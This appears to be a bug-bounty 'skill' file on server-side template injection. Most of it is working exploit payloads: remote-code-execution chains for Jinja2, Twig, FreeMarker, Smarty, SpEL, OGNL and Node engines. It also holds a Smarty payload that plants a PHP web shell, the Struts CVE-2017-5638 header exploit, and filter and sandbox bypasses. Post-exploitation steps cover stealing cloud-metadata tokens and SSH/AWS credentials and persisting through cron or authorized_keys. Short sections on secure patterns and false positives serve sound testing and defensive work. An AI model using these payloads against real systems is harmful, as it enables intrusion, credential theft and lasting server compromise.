---
name: "server-side-template-injection"
version: "2.0"
category: "injection"
subcategory: "ssti"
phase: "exploitation"
tags: ["bug-bounty", "freemarker", "injection", "jinja2", "ssti", "twig"]
tools: ["nuclei", "sstimap", "tplmap"]
follow_up_skills: ["rce", "ssrf", "remote-code-execution"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: server side template injection - exploitation phase, injection category"
---
# Server-Side Template Injection (SSTI)

## Summary

SSTI occurs when user input is unsafely embedded into a server-side template, allowing attackers to inject template directives. Can lead to sensitive data exposure, file reads, RCE, and full server compromise. Commonly affected engines: Jinja2, Twig, Django, Mako, Mustache, Smarty, FreeMarker, Handlebars, Nunjucks, and others.

## Attack Surface

### Input Shapes That Reach the Renderer

- Form fields, query/path/header values, cookies, JSON/GraphQL variables
- Filenames and file metadata processed by document/report templates
- Email subject/body/template-selector fields
- Theme/customization endpoints (CSS/HTML generation, dashboard widgets, webhook payload templates)
- Markdown/WYSIWYG content rendered through a templating layer downstream

### Code Patterns That Enable Injection

- User input concatenated into a template string before `render(template_str)` instead of passed as a context variable to `render(template_obj, context)`
- "Template editor" features for tenants/admins where the template itself is user-controllable
- `format()` / `sprintf()` / `printf`-style chains with user-controlled format string downstream of a template
- YAML/TOML/JSON values whose strings are later evaluated through a template

### Engines in Scope

- **Python**: Jinja2, Mako, Django (limited)
- **Java**: Velocity, Freemarker, Thymeleaf (with SpEL), JSP EL
- **JS/Node**: Handlebars, Nunjucks, EJS, Pug, Marko, Dust
- **Ruby**: ERB, Haml, Slim
- **PHP**: Twig, Smarty, Blade
- **.NET**: Razor, RazorEngine

## High-Value Targets

- Email rendering pipelines (subject/body/"from" templates)
- PDF/report generators (server-side render → headless browser)
- CMS theme and plugin editors
- Webhook and notification payload templates
- API response formatters that interpolate strings (pagination labels, error messages, custom field renders)
- Admin/tenant template editors — explicit "edit your template" features

## Key Concepts

- **Template engine**: Processes templates containing dynamic expressions (e.g., `{{7*7}}`) on the server side
- **Arithmetic probe**: `{{7*7}}` returning `49` is the universal SSTI confirmation
- **Engine fingerprinting**: Each engine has unique syntax and exploitation primitives
- **Blind SSTI**: No visible output, but time-delay payloads (`sleep(5)`) confirm injection
- **Sandbox escape**: Many engines run in restricted environments — exploitation requires breaking out via `__globals__`, `__subclasses__()`, or object traversal
- **Polyglot payload**: `${{<%[%'"}}%\.` — triggers errors across multiple engines simultaneously
- **Root Cause**: Concatenating or directly rendering user input within a template string, or using insecure template functions like `render_template_string`, `Template::render_inline`, or `Template.compile`

## Reconnaissance

### Injection Points

- Submit a benign string and grep responses (HTML, JSON, emails, PDFs) for verbatim reflection
- Anywhere user input ends up in a value that's clearly being templated (preview panes, "your message will look like…" panels) is high-signal
- Check error pages — many engines leak template syntax in stack traces

### Engine Fingerprinting

The classic differential probe — most engines evaluate exactly one of these, identifying themselves:

| Probe | Renders to | Engine family |
|---|---|---|
| `{{7*7}}` | 49 | Jinja2 / Twig / Nunjucks |
| `{{7*'7'}}` | 7777777 (Jinja) or 49 (Twig) | Distinguishes Jinja from Twig |
| `${7*7}` | 49 | Velocity / Freemarker / SpEL / JSP EL / Thymeleaf |
| `<%= 7*7 %>` | 49 | ERB / EJS |
| `#{7*7}` | 49 | Pug / some Ruby contexts |
| `{{= 7*7 }}` | 49 | doT.js |

For Thymeleaf specifically, the `*{...}` selection-expression form also evaluates but only inside a `th:object` scope; `${...}` is the universal probe.

Secondary signals: error message text (engine name in stack trace), comment-syntax differential (`{# #}` Jinja vs `<%# %>` ERB vs `{* *}` Smarty), filter syntax (`|` vs `:` vs space).

### Blind Probes

When output isn't reflected:

- **Time-based**: payload that triggers a sleep on the host language (`{{''.__class__.__mro__[1].__subclasses__()[<idx>](...)}}` for Jinja, `${T(java.lang.Thread).sleep(5000)}` for SpEL, `<%= sleep(5) %>` for ERB)
- **OAST**: payload that performs a DNS lookup or HTTP fetch to attacker infrastructure
- **Length/ETag diff**: payload whose evaluation changes the body length, even if the value isn't directly visible

## Technical Details

### Root Cause

Vulnerable pattern — user input concatenated directly into a template string:

```python
from jinja2 import Template
tmpl = Template("<html><h1>The user's name is: " + user_input + "</h1></html>")
print(tmpl.render())
```

If `user_input` is `{{1+1}}`, the engine executes the expression and outputs `2`.

Secure pattern — user input passed as a variable (treated as data, not code):

```python
return render_template_string('Welcome {{ username }}', username=user_input)
```

### Client-Side Template Injection (CSTI)

CSTI is the client-side variant — the template engine runs in the browser (AngularJS, Vue.js, Handlebars.js). Detection follows the same approach: `{{7*7}}` returning `49`.

### Vulnerable Input Areas

Look for features where user input appears in:
- Emails / email previews
- Invoices / receipts
- PDF and HTML generation
- Profile pages (display name, bio rendered via template)
- Error messages
- Search results
- Preview pages (markdown + template)

### Template Engine Detection

**Universal polyglot probe:** `${{<%[%'"}}%\.`

**Arithmetic tests:**

| Payload | Expected if SSTI |
|---------|-----------------|
| `{{7*7}}` | `49` |
| `${7*7}` | `49` |
| `<%= 7*7 %>` | `49` |
| `{{7*'7'}}` | `7777777` (string repetition) |
| `{{ '7'*7 }}` | `7777777` (Jinja2) |
| `@(1+2)` | `3` (.NET Razor) |
| `${7/0}` / `{{7/0}}` / `<%= 7/0 %>` | Error reveals engine |

**Engine-Specific Fingerprints:**

| Engine | Fingerprint Payload | Expected Behavior |
|--------|-------------------|-------------------|
| Jinja2 (Python) | `{{7*'7'}}` | `7777777` |
| Twig (PHP) | `{{_self.env.dump()}}` | Dumps environment |
| FreeMarker (Java) | `${7*7}` | `49` |
| Smarty (PHP) | `{$smarty.version}` | Version string |
| Mako (Python) | `${self.module.cache}` | Cache object |
| Velocity (Java) | `#set($x=1+1)$x` | `2` |
| Blade (Laravel 11) | `@dd($loop)` | Dumps loop var |
| Groovy/GSP | `<% 7*7 %>` | `49` in output |
| Handlebars (Node) | `{{this}}` | Context object |
| Nunjucks (Node) | `{{7*7}}` | `49` |
| EJS (Node) | `<%= 7*7 %>` | `49` |
| Liquid (Ruby) | `{{product.title}}` | Normal rendering |
| Tera/Askama (Rust) | `{{7*7}}` | `49` |
| Thymeleaf 3.1+ (Java) | `${7*7}` | `49` |

**Variable probing:** Try known variables — `{{config}}`, `{{settings}}`, `{{app.request.server.all|join(',')}}`, `{$smarty.version}`, `{% debug %}`.

### Blind SSTI

When output is not reflected, use time-based detection:

**Jinja2:**
```python
{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}
{{ cycler.__init__.__globals__.os.popen('sleep 5').read() }}
```

**Twig:**
```php
{% if system('sleep 5') %}{% endif %}
```

**FreeMarker:**
```java
${"".getClass().forName("java.lang.Thread").sleep(5000)}
```

### Recent CVEs (2024-2025)

| CVE | Affected | Severity | Fixed in |
|-----|----------|----------|----------|
| CVE-2024-22195 | Jinja2 sandbox / xmlattr filter bypass | High | 3.1.3 |
| CVE-2024-46507 | Yeti threat-intel platform SSTI → RCE | Critical | 1.6.2 |
| Various (2024) | Atlassian Confluence widgets, CrushFTP, HFS | Critical | Vendor advisories |

## Methodology

1. **Prepare fuzzing list**: Use `waybackurls` and `qsreplace` to generate parameter fuzzing URLs with `ssti{{9*9}}`.

2. **Identify all user-controlled inputs**: URL parameters, POST data, HTTP headers (Referer, User-Agent, custom headers), JSON keys, file upload metadata.

3. **Inject polyglot payloads**: Send `${{<%[%'"}}%\.`, `{{7*7}}`, `${7*7}` into every input point.

4. **Observe behavior**: Check for arithmetic evaluation (`49`), errors revealing engine, blank output, or no change. Differentiate server-side (SSTI) from client-side (CSTI).

5. **Identify the engine**: Use engine-specific syntax probes (`{{7*'7'}}`, `${7/0}`, `<%= 7/0 %>`) and known variable names (`{{config}}`, `{$smarty.version}`) with a decision tree.

6. **Test blind SSTI**: If no output is visible, use time-delay payloads like `{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}`.

7. **Probe engine globals**: Once the engine is identified, enumerate template context objects (`{{config}}`, `{{self}}`, `{% debug %}`, `{{_self.env.dump()}}`).

8. **Escalate to file read or RCE**: Use engine-specific `__subclasses__()` traversal, `__globals__` access, `?new()` instantiation, or prototype chain to achieve code execution.

9. **Create a non-destructive PoC**: `touch ssti_poc_by_YOUR_NAME.txt` via RCE.

10. **Chain and escalate**: Use RCE for SSRF pivot, internal network access, or cloud metadata exfiltration.

### Checklist

**Discovery:**
- [ ] User-controlled data appears inside templates
- [ ] Error messages reveal template engine type or syntax
- [ ] Arithmetic test performed (`{{7*7}}`)
- [ ] PDF generators, email previews, receipts checked

**Testing:**
- [ ] Arithmetic evaluation confirmed (output = 49)
- [ ] Filter/escaping behavior understood
- [ ] Engine-specific payloads tested
- [ ] Blind SSTI via time delay attempted

**Exploitation:**
- [ ] Template environment enumerated
- [ ] Global objects accessed
- [ ] Sensitive files read
- [ ] Command execution achieved (if possible)
- [ ] Sandbox escape performed

## Detection Commands

```bash
# Fuzz all params with arithmetic test via waybackurls + ffuf
waybackurls http://target.com | qsreplace "ssti{{9*9}}" > fuzz.txt
ffuf -u FUZZ -w fuzz.txt -replay-proxy http://127.0.0.1:8080/ -mr "ssti81"

# Quick manual probe
curl -s "https://target.com/page?name={{7*7}}" | grep -E "(49|7777777)"

# Test POST params
curl -s -X POST "https://target.com/search" \
  -d "q={{7*7}}" | grep -E "(49|7777777)"

# Test Header-based SSTI
curl -s -H "User-Agent: {{7*7}}" "https://target.com/page"

# Blind SSTI timing test
time curl -s "https://target.com/page?name={{self.__init__.__globals__.__builtins__.__import__('time').sleep(3)}}"

# Automated scanning
python3 sstimap.py -u "https://example.com/page?name=John" -s
tinja url -u "http://example.com/?name=Kirlia"
```

## Exploitation Payloads

### Universal Probe

```
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
{{=7*7}}
{7*7}
@(1+2)
```

### Jinja2 (Python / Flask)

```python
# Debug/Info
{{config}}
{{self}}
{{settings.SECRET_KEY}}
{% debug %}

# Quote-less probe (bypasses some filters)
{{[].__class__.__mro__[1]}}

# List subclasses
{{ [].__class__.__base__.__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__() }}

# RCE via __subclasses__ (find subprocess.Popen index)
{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()[0].strip() }}

# RCE via __globals__ — common paths
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ get_flashed_messages.__globals__.__builtins__.eval("__import__('os').popen('id').read()") }}

# RCE via warning class search
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("ls").read()}}{%endif%}{% endfor %}

# RCE via config and import_string
{{ config.__class__.from_envvar.__globals__.import_string("os").popen("ls").read() }}

# Read file (via __subclasses__ — index 40 for FileLoader, varies)
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}

# Write file
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evil', 'w').write('hello') }}

# Write evil config & RCE
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}
{{ config['RUNCMD']('id',shell=True) }}

# Avoid HTML encoding
{{'<script>alert(1)</script>'|safe}}

# Loop
{% for c in [1,2,3] %}{{ c,c,c }}{% endfor %}
```

### Twig (PHP)

```php
{{7*7}}
{{_self.env.dump()}}
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}
{{app.request.server.all|join(',')}}
{{dump(app)}}                                          # Symfony debug
{{'/etc/passwd'|file_excerpt(1,30)}}                   # File read via file_excerpt filter
{% for k,v in _self %}                                 # Enumerate _self properties
```

### FreeMarker (Java)

```java
${7*7}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
${"freemarker.template.utility.Execute"?new()("id")}
${product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec("id")}
File read: ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(" ")}
Info: ${class.getResource("").getPath()}, ${T(java.lang.System).getenv()}
```

### Smarty (PHP)

```php
{$smarty.version}
{php}echo id;{/php}
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

### Blade (Laravel)

Blade compiles templates to PHP on first render and caches the compiled output. The dangerous paths are runtime:

- `Blade::render($userControlledString, ...)`
- `Blade::compileString(...)` with user input
- Any reachable `@php ... @endphp` block whose body is composed from user input

All three are direct RCE.

### Mako (Python)

```python
${7*7}
${self.module.cache}
${__import__('os').popen('id').read()}
${self.module.os.popen('id').read()}
```

### Velocity (Java)

Velocity gadgets typically don't have `$Runtime` in context — that's not a standard Velocity built-in. The portable approach is string-class reflection from any reachable object:

```java
#set($s = "")
#set($r = $s.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))
$r.exec("id")
```

If using Velocity Tools, `$class` (a ClassTool) is often in scope and shortens the chain:

```java
#set($str=$class.inspect("java.lang.String").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
```

Note: `Runtime.exec()` returns a `java.lang.Process` object whose `toString()` is `"Process[pid=...]"`, not the command's stdout. For reflected output, wrap with `Scanner` or `BufferedReader`:

### Expression Language (EL) Injection

#### Spring SpEL (Spring Framework)

```java
# Detection
${7*7}
#{7*7}

# RCE
${T(java.lang.Runtime).getRuntime().exec('whoami')}
#{T(java.lang.Runtime).getRuntime().exec('whoami')}

# Alternative with output capture
${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('whoami').getInputStream())}

# Bypass blacklist via string concatenation
${T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"whoami"})}
```

#### Thymeleaf Specifics

Thymeleaf SSTI requires control over the **template source**, not just over a model variable bound into the template — normal Spring MVC binding renders `${userInput}` as a value, never re-evaluated as SpEL. The exploitable surface is `templateEngine.process(userControlledString, ctx)`, admin-editable email/notification templates, and template fragments composed from user input. When that surface exists, the same SpEL payloads apply:

```html
<div th:utext="${T(java.lang.Runtime).getRuntime().exec('id')}"></div>
<div th:utext="${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('id').getInputStream()).useDelimiter('\\A').next()}"></div>
```

Confusing this with normal model binding produces false positives — confirm the template source itself is attacker-influenced before flagging.

#### OGNL (Object-Graph Navigation Language — Struts)

```java
# Detection
${7*7}

# RCE
${@java.lang.Runtime@getRuntime().exec('whoami')}

# CVE-2017-5638 (Content-Type exploitation)
Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

#### MVEL (MVFLEX Expression Language)

```java
# Detection
${7*7}

# RCE
Runtime.getRuntime().exec("whoami");
```

### Ruby (ERB, Slim)

```ruby
<%= `id` %>                       # Backticks — shortest path, reflects output
<%= IO.popen('id').read %>
<% require 'open3'; out, _ = Open3.capture2('id'); %><%= out %>
<%= system('id') %>               # Prints to server stdout, not HTTP body
```

Note: `system('id')` returns true/false and prints to the server's stdout — useful for confirming execution but not for capturing output. Pair with OAST or a side-effect (file write, DNS lookup) when the response doesn't reflect anything.

### Node.js (Nunjucks / Handlebars / EJS / Pug)

**EJS** evaluates inline JavaScript:

```javascript
<%= require('child_process').execSync('id').toString() %>
```

**Nunjucks** via constructor walk on reachable objects:

```javascript
{{range.constructor("return require('child_process').execSync('id')")()}}
```

**Prototype traversal to Function (universal):**

```javascript
{{this.constructor.constructor('return require("child_process").execSync("id")')()}}
<%=(global.constructor.constructor('return process.mainModule.require("child_process").execSync("id").toString()')())%>
```

Note: `process.mainModule.require(...)` is the older form, deprecated since Node 14 but still present in most CJS contexts.

**Handlebars** itself is harder (default helpers are restricted), but custom helpers that pass arguments to `eval`, `Function`, or `child_process` re-open the surface. Also probe for prototype pollution as an SSTI amplifier — once `Object.prototype` is polluted, downstream template logic may execute attacker-controlled code paths.

**Handlebars — Full RCE via prototype chain (when not sandboxed):**
```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### ASP / .NET (Razor)

```
@(1+2)
@System.Diagnostics.Process.Start("cmd.exe","/c echo RCE > C:/Windows/Tasks/test.txt");
<%= CreateObject("Wscript.Shell").exec("cmd /c whoami").StdOut.ReadAll() %>
```

### Perl (Template Toolkit)

```
[% PERL %] system("id"); [% END %]
<%= perl code %>
```

### Go (text/template)

```
{{ .System "ls" }}
```

### Liquid (Shopify/Ruby)

```liquid
{{'id' | system}}
```

### Blind SSTI — Timing

```
# Jinja2
{{ self.__init__.__globals__.__builtins__.__import__('time').sleep(5) }}

# Twig
{% if system('sleep 5') %}{% endif %}

# FreeMarker
${"".getClass().forName("java.lang.Thread").sleep(5000)}
```

## RCE Primitives

### Direct Command Execution by Language

- **Python**: `os.system`, `os.popen`, `subprocess.run`, `subprocess.Popen`, `__import__('os').system`
- **Java**: `Runtime.getRuntime().exec`, `ProcessBuilder`, `freemarker.template.utility.Execute`
- **Ruby**: backticks, `system`, `exec`, `Open3.capture2`, `IO.popen`, `%x{}`
- **JavaScript/Node**: `require('child_process').execSync` / `exec` / `spawn`; `require.main.require(...)`
- **PHP**: `system`, `passthru`, `exec`, `shell_exec`, backticks, `popen`

### Indirect / Second-Stage

- **File write to webroot** → trigger via subsequent HTTP request (when shell exec is blocked but file write isn't)
- **Define a function/macro inline** that runs on next render
- **Unsafe deserialization gadget** invoked through template (Java ObjectInputStream, Python pickle, PHP unserialize)
- **DNS/HTTP exfiltration** when shell exec produces no observable output

## Post-Exploitation

- Environment dump (`env`, `os.environ`, `System.getenv`) — credentials, cloud metadata tokens, internal URLs
- Cloud metadata fetch (`http://169.254.169.254/latest/meta-data/`, `http://metadata.google.internal/`) — IAM tokens
- Read filesystem secrets (`.env`, `.aws/credentials`, `~/.ssh/`, `/proc/self/environ`)
- Lateral via internal HTTP — service mesh endpoints reachable from the rendering host
- Persistence: cron, scheduled task, systemd unit, `~/.ssh/authorized_keys`, web shell in webroot

## Commands

```bash
# Install SSTI scanning tools
pip install sstimap
go install github.com/hahwul/tinja@latest

# Automated scanning with SSTImap
python3 sstimap.py -u "https://example.com/page?name=John" \
  --engine Jinja2 --os-cmd

# Automated scanning with TInjA
tinja url -u "http://example.com/?name=Kirlia"

# Nuclei SSTI templates
nuclei -t ssti/ -u https://target.com

# WaybackURLs fuzzing
waybackurls target.com | grep "=" | qsreplace '"><{{7*7}}>' > ssti_params.txt
ffuf -u "FUZZ" -w ssti_params.txt -mr "49"
```

## Tools

### Active Exploitation
- **tplmap** — `python tplmap.py -u 'http://www.target.com/page?name=John*'`
- **SSTImap** — `python3 sstimap.py -u "https://example.com/page?name=John" -s`
- **TInjA** — `tinja url -u "http://example.com/?name=Kirlia"`
- **crithit** — SSTI-centric fuzzer supporting Go/Tera, Blade, and Mako (2024)

### Burp Suite Extensions
- **Template Injector** — Maintained fork replacing TemplateTester
- **Server Side Template Injection** — Active scanner checks
- **Param Miner** — Discover hidden parameters accepting template input

### Scanning & Detection
- **Nuclei** — SSTI templates for automated detection
- **Semgrep** — SSTI rulesets for static analysis
- **GitHub CodeQL** — "SSTI" query pack (2024-10) covering Python, PHP, Go

### Framework-Specific
- **Jinja2 Sandbox Escape Tools** — Testing Jinja2 sandboxed environments
- **Node Template Tester** — EJS/Pug/Handlebars/Nunjucks testing suite

## Bypass Techniques

### Character Blacklist Bypass

**Use attr() instead of dot notation:**
```
{{ request|attr('application') }}  instead of  {{ request.application }}
```

**Hex/Octal encoding in strings:**
```
{{ request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']() }}
```

**URL parameter manipulation — pass attribute names via query string:**
```
?c=__class__ -> {{ request|attr(request.args.c) }}
?f=%s%sclass%s%s&a=_ -> {{ request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a)) }}
?l=a&a=_&a=_&a=class&a=_&a=_ -> {{ request|attr(request.args.getlist(request.args.l)|join) }}
```

### Keyword Filtering Bypass

**Concatenation:**
- `'os'.__class__` → `'o'+'s'`
- Use `"fl"~"ag"` (Twig) or `"fl"+"ag"` (Jinja2)

**Jinja2 context variables:** Access `os` via `{{ self._TemplateReference__context.cycler.__init__.__globals__.os }}`

### String-less Exploitation

Build strings from arithmetic or list indices to bypass quote filters:
```
{{ (().__class__.__base__.__subclasses__()[104].__init__.__globals__).os.popen('id').read() }}
```

### .NET Reflection

Use reflection to load assemblies or invoke methods indirectly. On modern ASP.NET Core, Razor limits direct process start — look for misused `Html.Raw`, custom tag helpers, or debug compilation flags.

### Sandbox Escape — Generic Patterns

- **Attribute lookup instead of direct access**: `{{x.__class__}}` blocked? try `{{x|attr('__class__')}}`
- **Class walk to recover deleted builtins**: `{{[].__class__.__base__.__subclasses__()}}` enumerates everything loaded
- **String constructor games**: `'__import__'.__class__` etc., when literal `__import__` is filtered
- **Filter/function aliasing**: same callable reachable via different names — find one not on the denylist
- **Implicit conversion**: object whose `__str__`/`toString` triggers code, coerced via concatenation

### Filter and Parser Evasion

- **Whitespace/case variants**: `{{7 *7}}`, `{{ 7*7 }}`, `{{7*7}}`
- **String concatenation**: `{{('__cl'+'ass__')}}`, `{{request|attr('__cl'~'ass__')}}` — splits a token
- **Encoding layering**: payload arrives URL-encoded, JSON-decoded, then template-rendered
- **Operator precedence**: `((7)*(7))`, `7**7`, `7+0+7`
- **Null byte truncation**: `{{x%00.evil}}` — terminates for pre-template filters but not the parser
- **Unicode normalization**: smart quotes, fullwidth digits — bypass naive denylists

### Polyglot and Chained Evaluation

- **Multi-engine pipelines**: output of engine A feeds engine B — craft payload valid in both
- **Markdown/RST embedded in a template**: code block survives and reaches the template
- **Format string → template**: printf-style format applied before template render

### Filtered Object Bypass

If `request`, `config`, `self`, `lipsum`, `cycler`, `joiner`, `namespace`, or `range` are blocked, try alternative paths:
- `get_flashed_messages.__globals__`
- `url_for.__globals__`
- `g.__class__.__init__.__globals__`

### WAF Evasion

- Use `${IFS}` for spaces
- URL-encode payloads: `%7b%7b7*7%7d%7d`
- HTML entity encode: `&#123;&#123;7*7&#125;&#125;`
- Double encoding: `%257b%257b7*7%257d%257d`
- Nested injection: `{{{{7*7}}}}`
- Alternative delimiters: `{%`, `{#`, `${`

## Validation

- Show evaluated output for two distinct expressions (`{{7*7}}` → 49 and `{{7*8}}` → 56) to rule out coincidence or hard-coded reflection
- Demonstrate object access (`{{self.__class__}}`, `${T(java.lang.Class)}`) confirming runtime reflection
- Demonstrate side effect — DNS lookup to attacker-controlled domain, sleep with measurable delta, file written to a known path
- For RCE: command output captured in response, file written, or OAST callback containing command output
- Provide minimal payload — the simplest expression that reaches RCE, not the kitchen-sink polyglot

## Chaining and Escalation

SSTI often leads directly to RCE, but can also be used for:

- **RCE**: Primary goal — gain shell access via engine-specific payloads.
- **File Exfiltration**: Read sensitive files (`/etc/passwd`, `web.config`, source code, credentials).
- **Information Disclosure**: Dump environment variables, application config (`{{config}}`, `{{settings}}`), object properties, internal network paths.
- **Internal Network Access**: Use RCE to pivot, scan internal networks, or access internal services.
- **Privilege Escalation**: Combine RCE with local exploits if the web server runs with elevated privileges.
- **Data Exfiltration**: Send internal data to attacker-controlled server via HTTP requests or DNS exfiltration from within template code.
- **SSRF Pivot**: Some engines permit URL-fetch filters (`{{''|fetch('http://...')}}`) — leverage SSTI to query cloud-metadata endpoints (AWS 169.254.169.254, GCP metadata.google.internal).

## CI/CD Integration

- **Nuclei** and **semgrep** include up-to-date SSTI rules — integrate into PR checks.
- **GitHub CodeQL** — "SSTI" query pack (released 2024-10) covers Python, PHP, Go.
- Add a CI gate blocking merges on raw `render_template_string` or `.format()` inside templates.

## Not a Finding If

- **Input is HTML-escaped** — If `{{7*7}}` renders as literal text `{{7*7}}` instead of `49`, no SSTI.
- **Evaluation is client-side** — If `{{7*7}}` evaluates to `49` in the browser via JavaScript framework (Angular, Vue), it's CSTI, not SSTI.
- **Engine sandbox prevents escape** — Some engines (Liquid, Tera default) tightly sandbox execution and prevent RCE.
- **No template engine present** — The endpoint renders plain HTML without any server-side template processing.
- **Template syntax reflected literally** (`{{7*7}}` rendered as `{{7*7}}`) — that's XSS-shaped, not SSTI.
- **Sandboxed environments where reflection succeeds but reachable objects expose nothing useful** (Jinja SandboxedEnvironment with no `request`/`config` in context).
- **Client-side template engines** (Vue, Angular, Mustache running in the browser) — CSTI, different impact (XSS, not RCE).
- **Markdown/static-site generators that template at build time only** — no user input reaches the build.
- **Thymeleaf normal model binding** — `${userInput}` in a `th:text` attribute is rendered as a value, never re-evaluated as SpEL. Only the template source itself matters.

## Notes

- `{{7*7}}` returning `49` is the single strongest indicator of SSTI.
- Error messages often leak the template engine type and version — read them carefully.
- Jinja2 in Flask apps has `config`, `request`, `session`, `g`, `url_for`, `get_flashed_messages` globals by default.
- Twig's `_self` is the primary escape vector in older versions.
- FreeMarker uses `?new()` to instantiate arbitrary Java classes — powerful for RCE.
- The index for `subprocess.Popen` in `__subclasses__()` differs between CPython 3.11 and 3.12 — enumerate at runtime instead of hard-coding.
- SSTI often leads directly to RCE, but can also be used for SSRF pivot — some engines permit URL-fetch filters (`{{''|fetch('http://...')}}`), leverage SSTI to query cloud-metadata endpoints.
- tplmap and sstimap can automate from detection through sandbox escape to shell.

### Pro Tips

- Always confirm with a second math probe (`{{7*8}}`) before celebrating — single-shot reflection of 49 could be coincidental
- Engine fingerprint first, gadget chain second — wrong-engine payloads are wasted requests and noise in WAF logs
- For Jinja, the highest-yield reachable global varies by framework (`request` in Flask, `config` always present, `cycler` in older Jinja); spray all three before walking subclasses
- SpEL is everywhere in Spring stacks — Thymeleaf, Spring Security expression language, Spring Cloud Gateway routes; the same payload shape (`${T(java.lang.Runtime)...}`) works across all of them
- EJS/Nunjucks are common in Express/Koa apps — `require('child_process').execSync('id')` if require is in scope (EJS), or escape via `range.constructor("return require('child_process')...")()` for Nunjucks
- Sandbox escapes are usually one indirection away — attr lookup, constructor traversal, MRO walk; most "sandboxed" environments still reach the runtime if you go through attribute access instead of direct reference
- Output not reflected? Time-based and OAST work as well as for SQLi — `${T(java.lang.Thread).sleep(5000)}` for SpEL, `{{cycler.__init__.__globals__.__import__('time').sleep(5)}}` for Jinja
- Email previews and PDF generators are gold mines — they're often built on the same engine as the public site but exposed to less-validated input flows

### Impact

- Remote code execution on the rendering host (the default outcome — almost every engine leaks a path to it)
- Server-side data exfiltration via gadget chains (filesystem, env vars, internal HTTP)
- Cloud credential theft via metadata service access from the compromised host
- Lateral movement into internal services reachable from the renderer
- Persistent backdoor via web shell or service-account key planting
- Build/supply-chain compromise when the templated content is a build artifact

## References

- https://portswigger.net/web-security/server-side-template-injection
- https://github.com/epinna/tplmap
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
- https://github.com/vladko312/SSTImap
- https://github.com/hahwul/tinja
- https://github.com/payloadbox/ssti-payloads
